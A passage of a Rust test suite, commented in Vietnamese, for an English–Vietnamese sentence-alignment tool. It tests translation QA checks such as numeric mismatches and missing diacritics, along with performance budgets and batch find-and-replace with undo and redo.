                k,
                100 + k,
                10 + k
            )
        })
        .collect();
    let rows: Vec<Row> = (0..n)
        .map(|k| pair_row(k, k, &en, &vi, Status::NeedsReview, None))
        .collect();
    let big = manual_session(en, vi, rows);
    let t0 = Instant::now();
    let rep = stats::report(&big);
    let ms = t0.elapsed().as_millis();
    if rep.rows != n || rep.paired.rows != n {
        return Err(format!(
            "phiên lớn: phải có {} hàng đủ hai phía, được {}/{}",
            n, rep.rows, rep.paired.rows
        ));
    }
    if rep.en.words == 0 || rep.vi.words == 0 {
        return Err("phiên lớn phải đếm được số từ khác 0".into());
    }
    if ms >= 300 {
        return Err(format!(
            "thống kê {} đoạn mất {} ms — vượt ngân sách 300 ms",
            n, ms
        ));
    }
    Ok(())
}

// ========================= BẢN 2.9: bảng soát lỗi QA (8 kiểm, thuần đọc) =========================

/// 46. [BẢN 2.9] QA DƯƠNG TÍNH: phiên dựng tay 8 hàng, mỗi hàng đúng 1 loại lỗi —
///     từng kiểm phải nổ đúng hàng, đúng mức (error/warning/info), đúng thứ tự ổn định;
///     bySeverity cộng đúng; hình dạng JSON (camelCase) như giao diện đang đọc.
fn t_qa_detects_all_eight() -> Result<(), String> {
    let en = vec![
        "The price is 3.5 million".to_string(),
        "Hello world banner".to_string(),
        "This is a very long English source sentence that spans more than forty characters"
            .to_string(),
        "Alpha  beta".to_string(),
        "See (note".to_string(),
        "NASA launched the rocket".to_string(),
        "I do not know among those things".to_string(),
        "Coffee filter paper".to_string(),
    ];
    let vi = vec![
        "Giá là 35 triệu".to_string(),
        "Hello world banner".to_string(),
        "Ngắn".to_string(),
        " Ok ".to_string(),
        "Xem ghi chú".to_string(),
        "Nasa phóng tên lửa".to_string(),
        "Toi khong biet giua nhung dieu do".to_string(),
        "Cafe\u{0301} phin".to_string(),
    ];
    let rows: Vec<Row> = (0..8)
        .map(|k| pair_row(k, k, &en, &vi, Status::NeedsReview, None))
        .collect();
    let rep = qa::report(&manual_session(en, vi, rows));
    if rep.total != 8 || rep.issues.len() != 8 {
        let found: Vec<String> = rep
            .issues
            .iter()
            .map(|i| format!("h{}:{}", i.row, i.check))
            .collect();
        return Err(format!(
            "phải phát hiện đúng 8 vấn đề (mỗi hàng 1 loại), được {}: {}",
            rep.total,
            found.join(", ")
        ));
    }
    let expect: [(usize, &str, Severity); 8] = [
        (0, "numeric-mismatch", Severity::Error),
        (1, "target-same-as-source", Severity::Error),
        (2, "length-outlier", Severity::Warning),
        (3, "double-space", Severity::Warning),
        (4, "unpaired-symbol", Severity::Warning),
        (5, "alluppercase-mismatch", Severity::Warning),
        (6, "missing-diacritics", Severity::Info),
        (7, "nfd-mixed", Severity::Info),
    ];
    for (k, (row, check, sev)) in expect.iter().enumerate() {
        let it = &rep.issues[k];
        if it.row != *row || it.check != *check || it.severity != *sev {
            return Err(format!(
                "vấn đề {}: hàng {} / {} / {:?} — kỳ vọng hàng {} / {} / {:?}",
                k, it.row, it.check, it.severity, row, check, sev
            ));
        }
    }
    // bySeverity đếm đúng theo mức
    if rep.by_severity.get("error") != Some(&2)
        || rep.by_severity.get("warning") != Some(&4)
        || rep.by_severity.get("info") != Some(&2)
    {
        return Err(format!("bySeverity sai: {:?}", rep.by_severity));
    }
    // chi tiết có con số/từ khoá người soát cần thấy
    if !rep.issues[0].detail.contains("3.5") || !rep.issues[0].detail.contains("35") {
        return Err("kiểm số liệu phải nêu cả 3.5 (thiếu) lẫn 35 (thừa)".into());
    }
    if !rep.issues[6].detail.contains("khong → không")
        || !rep.issues[6].detail.contains("giua → giữa")
    {
        return Err("kiểm thiếu dấu phải gợi ý dạng đúng (khong → không…)".into());
    }
    // hình dạng JSON khoá camelCase như giao diện đang đọc (row/severity/check/en/vi/detail)
    let v = serde_json::to_value(&rep).map_err(|e| e.to_string())?;
    if v["bySeverity"]["error"].as_u64() != Some(2)
        || v["total"].as_u64() != Some(8)
        || v["issues"].as_array().map(|a| a.len()) != Some(8)
    {
        return Err("JSON báo cáo phải có bySeverity/total/issues đúng hình dạng".into());
    }
    if v["issues"][0]["check"].as_str() != Some("numeric-mismatch")
        || v["issues"][0]["severity"].as_str() != Some("error")
        || v["issues"][0]["row"].as_u64() != Some(0)
    {
        return Err("JSON issue[0] phải là numeric-mismatch/error/row 0".into());
    }
    Ok(())
}

/// 47. [BẢN 2.9] QA ÂM TÍNH (không báo oan): 4.000≡4,000 · dấu nháy đơn "don't"
///     không bị coi là ngoặc lẻ · " «» cân · từ VI hợp lệ không dấu (cua, lam) không
///     bị to là thiếu dấu · NASA/WHO hai phía · độ dài trong khoảng · ngày tháng
///     ("March 12" → "12 tháng 3") · sạch = 0 vấn đề.
fn t_qa_no_false_positives() -> Result<(), String> {
    let en = vec![
        "We paid 4,000 dollars for 12 tickets".to_string(),
        "Don't stop believing".to_string(),
        "She said \"hello\" to me".to_string(),
        "He read «the news» today".to_string(),
        "NASA and WHO signed the memo".to_string(),
        "The quick brown fox jumps over the lazy dog near the river bank".to_string(),
        "Units cost 2000 each".to_string(),
        // tên tháng VI viết thành số ("March 12" → "12 tháng 3") — chuyển ngữ đúng,
        // KHÔNG được báo sai số liệu (phát hiện khi QA agent-browser trên bài mẫu demo)
        "Hanoi hosted the Green Tech Summit from March 12 to March 15, 2025, drawing more than 4,000 participants from 32 countries.".to_string(),
    ];
    let vi = vec![
        "Chúng tôi trả 4.000 đô cho 12 vé".to_string(),
        "Đừng ngừng tin tưởng".to_string(),
        "Cô ấy chào tôi".to_string(),
        "Ông đọc «tin tức» hôm nay".to_string(),
        "NASA và WHO ký bản ghi nhớ".to_string(),
        "Con cáo nâu nhanh nhẹn nhảy qua con chó lười biếng gần bờ sông".to_string(),
        "Mỗi đơn vị giá 2.000".to_string(),
        "Hà Nội tổ chức Hội nghị Công nghệ Xanh từ ngày 12 tháng 3 đến 15 tháng 3 năm 2025, thu hút hơn 4.000 người tham dự từ 32 quốc gia.".to_string(),
    ];
    let rows: Vec<Row> = (0..en.len())
        .map(|k| pair_row(k, k, &en, &vi, Status::AutoMatched, Some(0.8)))
        .collect();
    let rep = qa::report(&manual_session(en, vi, rows));
    if rep.total != 0 {
        let found: Vec<String> = rep
            .issues
            .iter()
            .map(|i| format!("h{} {} — {}", i.row, i.check, i.detail))
            .collect();
        return Err(format!(
            "phiên SẠCH phải 0 vấn đề, được {}: {}",
            rep.total,
            found.join(" | ")
        ));
    }
    // từ tiếng Việt HỢP LỆ không dấu (con cua, màu lam) không bị to là thiếu dấu
    let en2 = vec!["He ate the crab".to_string()];
    let vi2 = vec!["Anh ta ăn con cua với màu lam".to_string()];
    let rows2 = vec![pair_row(0, 0, &en2, &vi2, Status::AutoMatched, None)];
    let rep2 = qa::report(&manual_session(en2, vi2, rows2));
    if rep2.total != 0 {
        return Err(format!(
            "“cua/lam” là từ tiếng Việt hợp lệ — không được báo thiếu dấu: {}",
            rep2.issues[0].detail
        ));
    }
    // phiên rỗng → 0 vấn đề
    let rep0 = qa::report(&manual_session(Vec::new(), Vec::new(), Vec::new()));
    if rep0.total != 0 || !rep0.issues.is_empty() {
        return Err("phiên rỗng phải 0 vấn đề".into());
    }
    Ok(())
}

/// 48. [BẢN 2.9] QA SỐ LIỆU: chuẩn hoá THEO PHÍA bắt được lỗi dời dấu thập phân
///     (EN 3.5 vs VI 35), thiếu/thừa lần lặp (7 và 7 → chỉ 1 lần 7), $ % không tính
///     vào token số; 1,234.5 ≡ 1.234,5 và 2000 ≡ 2.000 không bị oan; tên tháng VI
///     viết thành số ("tháng 10") chỉ được tha KHI phía Anh có tên tháng tiếng Anh.
fn t_qa_numeric_edges() -> Result<(), String> {
    let en = vec![
        "Mixed 1,234.5 and 4,000 here".to_string(),
        "Rate is 3.5 percent".to_string(),
        "costs $100 and 50% more".to_string(),
        "twice 7 and 7 again".to_string(),
        // có tên tháng tiếng Anh → số sau "tháng" bên VI là chuyển ngữ đúng (không nổ)
        "Episode 3 aired in October.".to_string(),
        // KHÔNG có tên tháng → "tháng 10" là số thừa thật (phải nổ)
        "Episode 3 aired this week.".to_string(),
    ];
    let vi = vec![
        "Hỗn hợp 1.234,5 và 4.000 ở đây".to_string(),
        "Tỉ lệ là 35 phần trăm".to_string(),
        "tốn 100 đô và hơn 50% nữa".to_string(),
        "hai lần 7 thôi".to_string(),
        "Tập 3 phát sóng vào tháng 10.".to_string(),
        "Tập 3 phát sóng vào tháng 10.".to_string(),
    ];
    let rows: Vec<Row> = (0..6)
        .map(|k| pair_row(k, k, &en, &vi, Status::NeedsReview, None))
        .collect();
    let rep = qa::report(&manual_session(en, vi, rows));
    let num: Vec<&qa::Issue> = rep
        .issues
        .iter()
        .filter(|i| i.check == "numeric-mismatch")
        .collect();
    if num.len() != 3 {
        let all: Vec<String> = rep
            .issues
            .iter()
            .map(|i| format!("h{}:{}", i.row, i.check))
            .collect();
        return Err(format!(
            "phải có đúng 3 vấn đề số liệu (hàng 1, 3 và 5), được {}: {}",
            num.len(),
            all.join(", ")
        ));
    }
    if num[0].row != 1 || num[1].row != 3 || num[2].row != 5 {
        return Err(format!(
            "số liệu phải ở hàng 1, 3 và 5, được {}, {} và {}",
            num[0].row, num[1].row, num[2].row
        ));
    }
    if !num[0].detail.contains("3.5") || !num[0].detail.contains("35") {
        return Err(format!(
            "lỗi dời thập phân phải nêu 3.5 và 35: {}",
            num[0].detail
        ));
    }
    if !num[1].detail.contains("7") {
        return Err(format!("thiếu 1 lần số 7 phải được nêu: {}", num[1].detail));
    }
    if !num[2].detail.contains("10") {
        return Err(format!(
            "số sau \"tháng\" khi KHÔNG có tên tháng EN phải bị bắt là thừa: {}",
            num[2].detail
        ));
    }
    if num[0].severity != Severity::Error || num[2].severity != Severity::Error {
        return Err("sai số liệu phải là mức Lỗi (error)".into());
    }
    // không kiểm nào khác nổ trên 6 hàng này (đều sạch về khoảng trắng/ngoặc/hoa…)
    if rep.total != 3 {
        let all: Vec<String> = rep
            .issues
            .iter()
            .map(|i| format!("h{}:{}", i.row, i.check))
            .collect();
        return Err(format!(
            "6 hàng này chỉ có 3 lỗi số liệu, được {}: {}",
            rep.total,
            all.join(", ")
        ));
    }
    Ok(())
}

/// 49. [BẢN 2.9] QA HÀNG MỘT PHÍA: kiểm 1/4/5/6/8 chạy trên phía CÓ MẶT (soát đúng
///     nghĩa — số bên thiếu được liệt kê); kiểm 2/3 (cần đủ hai phía) bỏ qua.
fn t_qa_single_side() -> Result<(), String> {
    let en_doc = vec!["NASA spent  1,000 dollars (".to_string()];
    let vi_doc = vec!["Khong duoc di lu\u{0301}c nay".to_string()];
    let rows = vec![
        Row::single_side(Some((0, en_doc[0].clone())), None, Status::Unmatched),
        Row::single_side(None, Some((0, vi_doc[0].clone())), Status::Unmatched),
    ];
    let rep = qa::report(&manual_session(en_doc, vi_doc, rows));
    // hàng 0 (chỉ EN): số liệu thiếu + khoảng trắng kép + ngoặc mở + NASA mất = 4 vấn đề
    let row0: Vec<&str> = rep
        .issues
        .iter()
        .filter(|i| i.row == 0)
        .map(|i| i.check)
        .collect();
    let want0 = [
        "numeric-mismatch",
        "double-space",
        "unpaired-symbol",
        "alluppercase-mismatch",
    ];
    for w in want0 {
        if !row0.contains(&w) {
            return Err(format!(
                "hàng chỉ-EN phải nổ {} (kiểm chạy trên phía có mặt), được: {:?}",
                w, row0
            ));
        }
    }
    if row0.len() != want0.len() {
        return Err(format!(
            "hàng chỉ-EN phải đúng {} vấn đề, được {}: {:?}",
            want0.len(),
            row0.len(),
            row0
        ));
    }
    // hàng 1 (chỉ VI): thiếu dấu (khong/duoc) + NFD lẫn = 2 vấn đề
    let row1: Vec<&str> = rep
        .issues
        .iter()
        .filter(|i| i.row == 1)
        .map(|i| i.check)
        .collect();
    if row1.len() != 2 || !row1.contains(&"missing-diacritics") || !row1.contains(&"nfd-mixed") {
        return Err(format!(
            "hàng chỉ-VI phải nổ missing-diacritics + nfd-mixed, được {:?}",
            row1
        ));
    }
    // kiểm 2/3 không bao giờ nổ trên hàng một phía
    for i in &rep.issues {
        if i.check == "target-same-as-source" || i.check == "length-outlier" {
            return Err(format!(
                "kiểm {} cần đủ hai phía — không được nổ trên hàng một phía",
                i.check
            ));
        }
    }
    if rep.total != 6 {
        return Err(format!("tổng phải 4 + 2 = 6, được {}", rep.total));
    }
    Ok(())
}

/// 50. [BẢN 2.9] QA THUẦN ĐỌC + KHÔNG PHỤ THUỘC LaBSE: report() không đổi phiên
///     (JSON hàng nguyên xi, 0 snapshot, updated_at giữ); chạy 2 lần ra báo cáo
///     GIỐNG HỆT (tất định); rescan cả lô với cos tiêm = 1 (đường LaBSE) đổi điểm /
///     trạng thái nhưng BÁO CÁO QA KHÔNG ĐỔI — QA không đụng embedder.
fn t_qa_readonly_labse_independent() -> Result<(), String> {
    let store = temp_store("qa1");
    let mut s = align_to_session(&store, &corpus_en(), &corpus_vi())?;
    let before = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;
    let before_upd = s.updated_at;
    let rep1 = qa::report(&s);
    let rep2 = qa::report(&s); // chạy 2 lần — tất định
    if rep1 != rep2 {
        return Err("chạy 2 lần phải ra báo cáo giống hệt (tất định)".into());
    }
    let j1 = serde_json::to_string(&rep1).map_err(|e| e.to_string())?;
    let j2 = serde_json::to_string(&rep2).map_err(|e| e.to_string())?;
    if j1 != j2 {
        return Err("JSON hai lần chạy phải giống hệt (BTreeMap ổn định thứ tự)".into());
    }
    let after = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;
    if before != after {
        return Err("qa::report() phải THUẦN ĐỌC — không được thay đổi hàng nào".into());
    }
    if !s.undo_stack.is_empty() || !s.redo_stack.is_empty() {
        return Err("qa::report() không được đẩy snapshot hoàn tác".into());
    }
    if s.updated_at != before_upd {
        return Err("qa::report() không được đổi updated_at của phiên".into());
    }
    // đường CÓ LaBSE: chấm lại cả lô với cos=1 — điểm/trạng thái có thể đổi,
    // văn bản không đổi → báo cáo QA phải Y NGUYÊN
    s.rescan_all_with(&|_, _| Some(1.0))
        .map_err(|e| format!("rescan để thử phải được: {}", e))?;
    let rep3 = qa::report(&s);
    if rep1 != rep3 {
        return Err("QA không được phụ thuộc LaBSE/rescan — báo cáo phải giống hệt".into());
    }
    Ok(())
}

/// 51. [BẢN 2.9] QA HIỆU NĂNG: phiên 10.000 cặp đủ hai phía (số liệu mỗi hàng —
///     công việc dày nhất của kiểm 1) soát dưới 1.000 ms và 0 báo oan.
fn t_qa_perf_10k() -> Result<(), String> {
    let n = 10_000usize;
    let en: Vec<String> = (0..n)
        .map(|k| {
            format!(
                "Report {} says Alpha Corp shipped {} units worth {} million dollars.",
                k,
                100 + k,
                10 + k
            )
        })
        .collect();
    let vi: Vec<String> = (0..n)
        .map(|k| {
            format!(
                "Báo cáo {} cho biết Alpha Corp đã xuất {} sản phẩm trị giá {} triệu đô la.",
                k,
                100 + k,
                10 + k
            )
        })
        .collect();
    let rows: Vec<Row> = (0..n)
        .map(|k| pair_row(k, k, &en, &vi, Status::NeedsReview, None))
        .collect();
    let big = manual_session(en, vi, rows);
    let t0 = Instant::now();
    let rep = qa::report(&big);
    let ms = t0.elapsed().as_millis();
    if ms >= 1_000 {
        return Err(format!(
            "soát {} đoạn mất {} ms — vượt ngân sách 1.000 ms",
            n, ms
        ));
    }
    if rep.total != 0 {
        return Err(format!(
            "10.000 hàng sạch phải 0 báo oan, được {}: {}",
            rep.total, rep.issues[0].detail
        ));
    }
    Ok(())
}

// ========================= BẢN 2.9: tìm / lọc / thay thế hàng loạt (F3) =========================

/// 52. [BẢN 2.9] Thay thế cơ bản: 3 chỗ trong 3 khối VI (cột VI mặc định) — nội dung
///     đúng, tài liệu GỐC đồng bộ theo hàng, điểm hàng bị xoá, MỘT snapshot cho cả lô,
///     undo 1 nhấn trả NGUYÊN XI cả 3 (kể cả tài liệu gốc), redo áp lại.
fn t_replace_basic_undo_redo() -> Result<(), String> {
    let en = vec![
        "The summit opened in Hanoi".to_string(),
        "Delegates arrived early".to_string(),
        "The second day in Hanoi continued".to_string(),
        "Hanoi and Haiphong grew fast".to_string(),
    ];
    let vi = vec![
        "Hội nghị khai mạc tại Hà Nội".to_string(),
        "Đoàn đại biểu đến sớm".to_string(),
        "Ngày thứ hai tại Hà Nội tiếp tục".to_string(),
        "Hà Nội và Hải Phòng phát triển nhanh".to_string(),
    ];
    let rows: Vec<Row> = (0..4)
        .map(|k| pair_row(k, k, &en, &vi, Status::NeedsReview, Some(0.66)))
        .collect();
    let mut s = manual_session(en, vi, rows);
    let rows_before = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;
    let vi_before = serde_json::to_string(&s.vietnamese).map_err(|e| e.to_string())?;

    let out = s
        .replace_all(Side::Vi, "Hà Nội", "THỦY ĐÔ HÀ NỘI", false)
        .map_err(|e| format!("thay thế hợp lệ phải được: {}", e))?;
    if out.changed != 3 || out.blocks != 3 || out.rows != 3 {
        return Err(format!(
            "phải thay 3 chỗ / 3 khối / 3 hàng, được {}/{}:{}",
            out.changed, out.blocks, out.rows
        ));
    }
    // nội dung đúng — chuỗi mới chèn đúng chỗ, phần còn lại y nguyên
    if s.rows[0].vi.as_deref() != Some("Hội nghị khai mạc tại THỦY ĐÔ HÀ NỘI")
        || s.rows[1].vi.as_deref() != Some("Đoàn đại biểu đến sớm")
        || s.rows[3].vi.as_deref() != Some("THỦY ĐÔ HÀ NỘI và Hải Phòng phát triển nhanh")
    {
        return Err(format!(
            "nội dung sau thay sai: {:?}",
            s.rows.iter().map(|r| r.vi.clone()).collect::<Vec<_>>()
        ));
    }
    // điểm của hàng bị thay phải được xoá (chữ đã đổi — điểm cũ hết nghĩa); hàng sạch giữ điểm
    if s.rows[0].score.is_some() || s.rows[2].score.is_some() || s.rows[3].score.is_some() {
        return Err("hàng bị thay phải mất điểm (score = None)".into());
    }
    if s.rows[1].score != Some(0.66) {
        return Err("hàng không bị thay phải GIỮ điểm cũ".into());
    }
    // tài liệu GỐC đồng bộ theo hàng (đoạn 0 và 3 đã đổi)
    if s.vietnamese[0] != "Hội nghị khai mạc tại THỦY ĐÔ HÀ NỘI"
        || s.vietnamese[3] != "THỦY ĐÔ HÀ NỘI và Hải Phòng phát triển nhanh"
    {
        return Err("tài liệu gốc phải được đồng bộ theo khối mới".into());
    }
    // MỘT snapshot cho cả lô (không phải 3)
    if s.undo_stack.len() != 1 {
        return Err(format!(
            "thay cả lô phải đẩy đúng 1 snapshot, được {}",
            s.undo_stack.len()
        ));
    }
    // xuất file kiểm bất biến vẫn OK (hàng ↔ tài liệu gốc khớp nhau)
    if let Err(e) = export_session(&s, ExportFormat::Tsv) {
        return Err(format!("xuất TSV sau thay thế phải hợp lệ: {}", e));
    }
    // HOÀN TÁC 1 nhấn → nguyên xi CẢ 3 chỗ + tài liệu gốc + điểm cũ
    s.undo().map_err(|e| e.to_string())?;
    let rows_after_undo = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;
    if rows_after_undo != rows_before {
        return Err("sau undo, hàng phải trả NGUYÊN XI (kể cả điểm)".into());
    }
    let vi_after_undo = serde_json::to_string(&s.vietnamese).map_err(|e| e.to_string())?;
    if vi_after_undo != vi_before {
        return Err("sau undo, TÀI LIỆU GỐC cũng phải trả nguyên xi (sync_docs_from_rows)".into());
    }
    if let Err(e) = export_session(&s, ExportFormat::Tsv) {
        return Err(format!("xuất TSV sau undo phải hợp lệ: {}", e));
    }
    // LÀM LẠI → áp lại cả lô như trước undo
    s.redo().map_err(|e| e.to_string())?;
    if s.rows[0].vi.as_deref() != Some("Hội nghị khai mạc tại THỦY ĐÔ HÀ NỘI") {
        return Err("sau redo, thay thế phải áp lại".into());
    }
    if s.vietnamese[0] != "Hội nghị khai mạc tại THỦY ĐÔ HÀ NỘI" {
        return Err("sau redo, tài liệu gốc cũng áp lại".into());
    }
    Ok(())
}

/// 53. [BẢN 2.9] Phân biệt hoa thường + chọn cột: không-phân-biệt bắt "The"/"the"/"THE"
///     (3 chỗ, thay đúng chỗ); phân-biệt chỉ bắt đúng 1; cột EN không đụng chữ VI và ngược lại.
fn t_replace_case_and_column() -> Result<(), String> {
    let en = vec![
        "The cat sat".to_string(),
        "the dog ran".to_string(),
        "THE bird flew".to_string(),
    ];
    let vi = vec![
        "Con mèo ngồi".to_string(),
        "Con chó chạy".to_string(),
        "Con chim bay".to_string(),
    ];
    let rows: Vec<Row> = (0..3)
        .map(|k| pair_row(k, k, &en, &vi, Status::NeedsReview, None))
        .collect();
    let mut s = manual_session(en, vi, rows);

    // KHÔNG phân biệt hoa thường: "The" bắt cả "The"/"the"/"THE" — 3 chỗ
    let out = s
        .replace_all(Side::En, "The", "A", false)
        .map_err(|e| e.to_string())?;
    if out.changed != 3 {
        return Err(format!(
            "không phân biệt hoa thường: \"The\" phải bắt 3 chỗ (The/the/THE), được {}",
            out.changed
        ));
    }
    if s.rows[0].en.as_deref() != Some("A cat sat")
        || s.rows[1].en.as_deref() != Some("A dog ran")
        || s.rows[2].en.as_deref() != Some("A bird flew")
    {
        return Err(format!(
            "thay không-phân-biệt-hoa sai chỗ: {:?}",
            s.rows.iter().map(|r| r.en.clone()).collect::<Vec<_>>()
        ));
    }
    // cột EN không đụng chữ VI
    if s.rows[0].vi.as_deref() != Some("Con mèo ngồi") {
        return Err("thay cột EN không được đụng chữ VI".into());
    }
    // HOÀN TÁC rồi thử PHÂN BIỆT hoa thường: chỉ "the" (hàng 1) khớp — 1 chỗ
    s.undo().map_err(|e| e.to_string())?;
    let out_cs = s
        .replace_all(Side::En, "the", "X", true)
        .map_err(|e| e.to_string())?;
    if out_cs.changed != 1 || s.rows[1].en.as_deref() != Some("X dog ran") {
        return Err(format!(
            "phân biệt hoa thường: chỉ \"the\" hàng 1 khớp, được {} chỗ",
            out_cs.changed
        ));
    }
    if s.rows[0].en.as_deref() != Some("The cat sat")
        || s.rows[2].en.as_deref() != Some("THE bird flew")
    {
        return Err("phân biệt hoa thường không được đổi The/THE".into());
    }
    // cột VI thay mà cột EN giữ nguyên
    let out_vi = s
        .replace_all(Side::Vi, "Con", "Những con", true)
        .map_err(|e| e.to_string())?;
    if out_vi.changed != 3 {
        return Err(format!("cột VI phải thay 3 chỗ, được {}", out_vi.changed));
    }
    if s.rows[0].en.as_deref() != Some("The cat sat") {
        return Err("thay cột VI không được đụng chữ EN".into());
    }
    // vùng khớp thô (find_match_ranges): không chồng lấn "aa" trong "aaa" = 1 chỗ
    let r = find_match_ranges("aaa", "aa", true);
    if r.len() != 1 {
        return Err(format!(
            "\"aa\" trong \"aaa\" phải 1 chỗ không chồng lấn, được {}",
            r.len()
        ));
    }
    Ok(())
}

/// 54. [BẢN 2.9] Đầu vào xấu: chuỗi tìm rỗng/toàn khoảng trắng → lỗi; tìm == thay →
///     lỗi; cột lạ không phân giải được; 0 chỗ khớp → changed=0, KHÔNG snapshot,
///     KHÔNG đổi updated_at (canUndo giữ nguyên).
fn t_replace_invalid_inputs() -> Result<(), String> {
    let en = vec!["Alpha beta".to_string()];
    let vi = vec!["Mô tả hai từ".to_string()];
    let rows = vec![pair_row(0, 0, &en, &vi, Status::NeedsReview, None)];
    let mut s = manual_session(en, vi, rows);

    if s.replace_all(Side::Vi, "", "x", false).is_ok() {
        return Err("chuỗi tìm rỗng phải bị từ chối".into());
    }
    if s.replace_all(Side::Vi, "   ", "x", false).is_ok() {
        return Err("chuỗi tìm toàn khoảng trắng phải bị từ chối".into());
    }
    if s.replace_all(Side::Vi, "Hà Nội", "Hà Nội", false).is_ok() {
        return Err("tìm == thay phải bị từ chối (không có gì để thay)".into());
    }
    if Side::parse("fr").is_some() {
        return Err("cột lạ (fr) không được phân giải thành phía nào".into());
    }
    // 0 chỗ khớp → Ok(0) nhưng KHÔNG snapshot, KHÔNG đổi gì (kể cả updated_at)
    let before_upd = s.updated_at;
    let rows_before = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;
    let out = s
        .replace_all(Side::Vi, "không-tồn-tại-chuỗi-này", "x", false)
        .map_err(|e| e.to_string())?;
    if out.changed != 0 || out.blocks != 0 || out.rows != 0 {
        return Err("0 chỗ khớp phải trả 0/0/0".into());
    }
    if !s.undo_stack.is_empty() {
        return Err("0 chỗ khớp KHÔNG được đẩy snapshot hoàn tác".into());
    }
    if s.updated_at != before_upd {
        return Err("0 chỗ khớp không được đổi updated_at".into());
    }
    let rows_after = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;
    if rows_before != rows_after {
        return Err("0 chỗ khớp không được đổi hàng nào".into());
    }
    Ok(())
}

/// 55. [BẢN 2.9] Lô lớn + hàng GỘP: 5 hàng × 2 chỗ mỗi hàng = 10 lần thay trong 5 hàng,
///     đúng 1 snapshot cho cả lô; hàng gộp (1 EN · 2 VI) thay đủ CẢ HAI khối VI của nó.
fn t_replace_batch_and_merged_rows() -> Result<(), String> {
    // EN 5 đoạn / VI 6 đoạn — hàng 1 là hàng GỘP 1 EN · 2 VI (đoạn VI kề nhau 1+2,
    // đúng bất biến I3 đơn điệu; gộp thật chỉ xảy ra với đoạn kề nhau)
    let en = vec![
        "Row one text here".to_string(),
        "Row two text here".to_string(),
        "Row three text".to_string(),
        "Row four text".to_string(),
        "Row five text".to_string(),
    ];
    let vi = vec![
        "Hàng một chấm chấm và chấm chấm nữa".to_string(),
        "Hàng hai chấm chấm đây".to_string(),
        "Hàng ba chấm chấm đây".to_string(),
        "Hàng bốn chấm chấm và chấm chấm nữa".to_string(),
        "Hàng năm chấm chấm và chấm chấm nữa".to_string(),
        "Hàng sáu chấm chấm và chấm chấm nữa".to_string(),
    ];
    // hàng 1 GỘP: 1 EN (đoạn 1) · 2 VI (khối chính đoạn 1 + khối gộp đoạn 2 = 2 chỗ/hàng)
    let mut merged = pair_row(1, 1, &en, &vi, Status::NeedsReview, None);
    merged.vi_extra = vec![Seg {
        index: 2,
        text: vi[2].clone(),
    }];
    let rows = vec![
        pair_row(0, 0, &en, &vi, Status::NeedsReview, None),
        merged,
        pair_row(2, 3, &en, &vi, Status::NeedsReview, None),
        pair_row(3, 4, &en, &vi, Status::NeedsReview, None),
        pair_row(4, 5, &en, &vi, Status::NeedsReview, None),
    ];
    let mut s = manual_session(en, vi, rows);
    let rows_before = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;

    // "chấm chấm": 4 hàng đơn × 2 chỗ + hàng gộp (1 khối chính + 1 khối gộp) = 10 chỗ / 6 khối / 5 hàng
    let out = s
        .replace_all(Side::Vi, "chấm chấm", "dấu", false)
        .map_err(|e| e.to_string())?;
    if out.changed != 10 || out.blocks != 6 || out.rows != 5 {
        return Err(format!(
            "phải thay 10 chỗ / 6 khối / 5 hàng, được {}/{}:{}",
            out.changed, out.blocks, out.rows
        ));
    }
    // hàng đơn đầu: 2 chỗ trong CÙNG một khối đều được thay
    if s.rows[0].vi.as_deref() != Some("Hàng một dấu và dấu nữa") {
        return Err(format!(
            "2 chỗ trong 1 khối phải thay đủ: {:?}",
            s.rows[0].vi
        ));
    }
    // hàng gộp: CẢ HAI khối VI của nó đều được thay (khối chính + khối gộp)
    let r1 = &s.rows[1];
    if r1.vi.as_deref() != Some("Hàng hai dấu đây")
        || r1.vi_extra.len() != 1
        || r1.vi_extra[0].text != "Hàng ba dấu đây"
    {
        return Err(format!(
            "hàng gộp phải thay đủ cả khối chính + khối gộp: chính={:?} extra={:?}",
            r1.vi, r1.vi_extra
        ));
    }
    // đúng 1 snapshot cho cả lô 10 chỗ
    if s.undo_stack.len() != 1 {
        return Err(format!(
            "10 chỗ trong 5 hàng phải đúng 1 snapshot, được {}",
            s.undo_stack.len()
        ));
    }
    // xuất sau thay OK, hoàn tác 1 nhấn trả đủ cả 5 hàng nguyên xi
    if let Err(e) = export_session(&s, ExportFormat::Tsv) {
        return Err(format!("xuất TSV sau thay lô lớn phải hợp lệ: {}", e));
    }
    s.undo().map_err(|e| e.to_string())?;
    let rows_after = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;
    if rows_before != rows_after {
        return Err("undo 1 nhấn phải trả nguyên xi cả lô 5 hàng".into());
    }
    Ok(())
}

/// 56. [BẢN 2.9] Biên Unicode + hiệu năng: thay trong chữ Việt có dấu; emoji ZWJ
///     nguyên vẹn; thay TOÀN BỘ nội dung 1 khối thành rỗng vẫn xuất được; tìm NFC
///     trong chuỗi NFD không khớp (quy ước so-theo-ký-tự); phiên 10.000 hàng < 1 s.
fn t_replace_unicode_edges_perf() -> Result<(), String> {
    // chữ Việt có dấu — substring theo KÝ TỰ (không phải byte) nên an toàn UTF-8
    let en = vec!["Emoji and accents".to_string()];
    let vi = vec![
        "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}\u{200d}\u{1f466} đi nghỉ dưỡng tại gia đình"
            .to_string(),
    ];
    let rows = vec![pair_row(0, 0, &en, &vi, Status::NeedsReview, None)];
    let mut s = manual_session(en, vi, rows);
    let out = s
        .replace_all(Side::Vi, "gia đình", "nhà", false)
        .map_err(|e| e.to_string())?;
    if out.changed != 1 {
        return Err(format!(
            "thay chữ Việt có dấu phải 1 chỗ, được {}",
            out.changed
        ));
    }
    let expect =
        "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}\u{200d}\u{1f466} đi nghỉ dưỡng tại nhà";
    if s.rows[0].vi.as_deref() != Some(expect) {
        return Err("emoji ZWJ ghép phải nguyên vẹn sau thay".into());
    }
    if s.vietnamese[0] != expect {
        return Err("tài liệu gốc cũng phải giữ emoji nguyên vẹn".into());
    }
    // thay TOÀN BỘ khối thành rỗng → khối rỗng vẫn hợp lệ, xuất được
    let out2 = s
        .replace_all(Side::Vi, expect, "", false)
        .map_err(|e| e.to_string())?;
    if out2.changed != 1 || s.rows[0].vi.as_deref() != Some("") {
